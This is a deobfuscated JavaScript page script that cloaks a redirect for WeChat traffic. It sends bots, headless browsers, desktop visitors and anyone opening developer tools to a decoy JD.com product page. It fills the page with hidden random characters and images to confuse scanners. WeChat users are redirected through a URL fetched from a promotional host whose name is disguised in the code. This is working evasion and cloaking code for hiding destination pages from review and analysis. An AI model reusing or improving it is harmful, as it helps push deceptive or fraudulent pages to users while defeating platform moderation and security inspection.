//Sun Mar 16 2025 12:10:42 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {
  function _0x29708d(_0x1c7a8, _0x31d521, _0x1bb2bc) {
    function _0x43175a(_0x2cda1e, _0xb067b1) {
      if (!_0x31d521[_0x2cda1e]) {
        if (!_0x1c7a8[_0x2cda1e]) {
          var _0x57d667 = "function" == typeof require && require;
          if (!_0xb067b1 && _0x57d667) {
            return _0x57d667(_0x2cda1e, true);
          }
          if (_0x499cb6) {
            return _0x499cb6(_0x2cda1e, true);
          }
          var _0x24eee2 = new Error("Cannot find module '" + _0x2cda1e + "'");
          throw _0x24eee2.code = "MODULE_NOT_FOUND", _0x24eee2;
        }
        _0x31d521[_0x2cda1e] = {
          exports: {}
        };
        var _0x429543 = _0x31d521[_0x2cda1e];
        _0x1c7a8[_0x2cda1e][0].call(_0x429543.exports, function (_0x31a119) {
          var _0xac65f = _0x1c7a8[_0x2cda1e][1][_0x31a119];
          return _0x43175a(_0xac65f || _0x31a119);
        }, _0x429543, _0x429543.exports, _0x29708d, _0x1c7a8, _0x31d521, _0x1bb2bc);
      }
      return _0x31d521[_0x2cda1e].exports;
    }
    for (var _0x499cb6 = "function" == typeof require && require, _0x313051 = 0; _0x313051 < _0x1bb2bc.length; _0x313051++) {
      _0x43175a(_0x1bb2bc[_0x313051]);
    }
    return _0x43175a;
  }
  return _0x29708d;
})()({
  1: [function (_0xbe15f6, _0x127e8f, _0x205be7) {
    (function () {
      const _0x1a1d06 = "https://item.m.jd.com/ware/view.action?wareId=1300251";
      function _0x47f897() {
        const _0x2d3a89 = window.navigator.userAgent.toLowerCase();
        if (_0x2d3a89.match(/MicroMessenger/i) == "micromessenger") {
          window.location.replace(_0x1a1d06);
          return;
        }
        if (_0x2d3a89.indexOf(" qq") > -1 && _0x2d3a89.indexOf(" mqqbrowser") < 0) {
          window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
          return;
        }
      }
      function _0x8bd993() {
        var _0x2b834c = navigator.userAgent.toLowerCase();
        var _0x23140b = _0x2b834c.match(/ipad/i) == "ipad";
        var _0x991e9c = _0x2b834c.match(/iphone os/i) == "iphone os";
        var _0x2b8bec = _0x2b834c.match(/midp/i) == "midp";
        var _0x499818 = _0x2b834c.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
        var _0x393937 = _0x2b834c.match(/ucweb/i) == "ucweb";
        var _0x28f350 = _0x2b834c.match(/android/i) == "android";
        var _0x4a241b = _0x2b834c.match(/windows ce/i) == "windows ce";
        var _0xde718b = _0x2b834c.match(/windows mobile/i) == "windows mobile";
        if (!(_0x23140b || _0x991e9c || _0x2b8bec || _0x499818 || _0x393937 || _0x28f350 || _0x4a241b || _0xde718b)) {
          window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
          return false;
        }
        if (window.navigator.platform.indexOf("Win") > -1 || window.navigator.platform.indexOf("Mac") > -1) {
          window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
          return false;
        }
      }
      _0x8bd993();
      document.oncontextmenu = function () {
        window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
        return false;
      };
      document.onkeydown = function () {
        var _0x298a16 = window.event || arguments[0];
        _0x298a16 && _0x298a16.keyCode == 123 && (window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251", _0x298a16.keyCode = 0, _0x298a16.returnValue = false);
        _0x298a16.ctrlKey && _0x298a16.shiftKey && _0x298a16.keyCode == 73 && (window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251", _0x298a16.keyCode = 0, _0x298a16.returnValue = false);
        _0x298a16.ctrlKey && _0x298a16.keyCode == 17 && (window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251", _0x298a16.keyCode = 0, _0x298a16.returnValue = false);
      };
      if (!_0x17e32b()) {
        window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
        return false;
      }
      function _0x17e32b() {
        var _0x18b5c4 = document.createElement("canvas");
        return !!(_0x18b5c4.getContext && _0x18b5c4.getContext("2d"));
      }
      function _0x347add() {
        let _0x196492 = 2;
        let _0x48b5f1 = 0;
        let _0x5355f3 = "";
        let _0x325a1f = 20000;
        let _0x2cb9ea = 1000;
        while (_0x48b5f1 < _0x196492) {
          _0x48b5f1++;
          var _0x5d3b71 = parseInt(Math.random() * _0x2cb9ea);
          _0x5355f3 += String.fromCharCode(_0x325a1f + _0x5d3b71);
        }
        return _0x5355f3;
      }
      function _0xc8177b() {
        let _0x568daa = ["margin:-100px;", "top:100%;", "border: 1px solid red;", "flex-grow: 1;", "width: 1000px", "color: #fff", "overflow: hidden;"];
        let _0xf396e9 = "display:none;";
        let _0x4c9741 = Math.floor(Math.random() * 7);
        for (let _0x7b251d = 0; _0x7b251d <= _0x4c9741; _0x7b251d++) {
          _0xf396e9 += _0x568daa[_0x7b251d];
        }
        return _0xf396e9;
      }
      let _0x1339ed = "";
      let _0x59b54c = new Array(5).fill(" ").toString().split("");
      let _0x6dda63 = "https://preview.qiantucdn.com//36/04d58PICRWDHN9PIkZRiI_PIC20";
      for (let _0x227a1c of _0x59b54c) {
        const _0x1ff90d = Math.floor(Math.random() * 90) + 10;
        _0x1339ed += _0x227a1c + "<span style=\"" + _0xc8177b() + "\">" + _0x347add() + "<img style=\"display: none;\" src=\"" + _0x6dda63 + _0x1ff90d + ".png\" /></span>";
      }
      window.onload = function () {
        document.getElementById("nav").innerHTML = _0x1339ed;
      };
      const _0x115206 = localStorage.getItem("clickfirst");
      if (_0x362d21("wx")) {
        _0x115206 && _0x115206 === "1" ? _0x1a6d3e() : document.addEventListener("click", function (_0x6552f2) {
          localStorage.setItem("clickfirst", "1");
          _0x1a6d3e();
        });
      } else {
        window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
        return;
      }
      function _0x5b4193() {
        const _0x332df4 = window.location.search;
        const _0x4dee6a = new URLSearchParams(_0x332df4);
        for (let [_0x390203, _0x49647b] of _0x4dee6a) {
          if (_0x390203.charAt(0) === _0x390203.charAt(0).toUpperCase()) {
            return _0x49647b;
          } else {
            if (_0x390203.indexOf("pid") > -1) {
              return _0x49647b;
            }
          }
        }
      }
      function _0x155ca5(_0x9f35cf) {
        const _0x11cee5 = _0x9f35cf.scheme === 1 ? "tp" : "tps";
        const _0xd7050b = _0x9f35cf.authority.replace(/\/-/g, ".");
        let _0x49a077 = "t" + _0x11cee5 + ":/" + "/" + _0xd7050b;
        return _0x49a077;
      }
      function _0x362d21(_0x4f4411) {
        const _0x13652e = window.navigator.userAgent.toLowerCase();
        if (window.navigator.webdriver) {
          window.location.href = "https://item.m.jd.com/ware/view.action?wareId=1300251";
          return;
        }
        if (/HeadlessChrome/.test(window.navigator.userAgent)) {
          window.location.href = _0x1a1d06;
          return;
        }
        if (_0x4f4411 === "wx") {
          return _0x13652e.match(/MicroMessenger/i) == "micromessenger" ? true : false;
        } else {
          if (_0x4f4411 === "qq") {
            return _0x13652e.indexOf(" qq") > -1 && _0x13652e.indexOf(" mqqbrowser") > -1 ? true : false;
          }
        }
      }
      function _0x1a6d3e() {
        const _0x32669e = _0x5b4193();
        const _0x24cba4 = new XMLHttpRequest();
        const _0x1214ac = "hhl/-tuiguang50/-cn/blade-app/entrance/getNextUrl";
        const _0x4e7bcb = "//" + _0x1214ac.replace(/\/-/g, ".");
        _0x24cba4.open("POST", _0x4e7bcb, true);
        _0x24cba4.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        _0x24cba4.onreadystatechange = function () {
          if (_0x24cba4.readyState === 4 && _0x24cba4.status === 200) {
            var _0x536a73 = JSON.parse(_0x24cba4.responseText);
            _0x536a73.code === 200 ? window.location.replace("h" + _0x155ca5(_0x536a73.data) + "?" + _0x536a73.data.query) : alert(_0x536a73.msg);
          }
        };
        _0x24cba4.send("state=" + _0x32669e);
      }
    })();
  }, {}]
}, {}, [1]);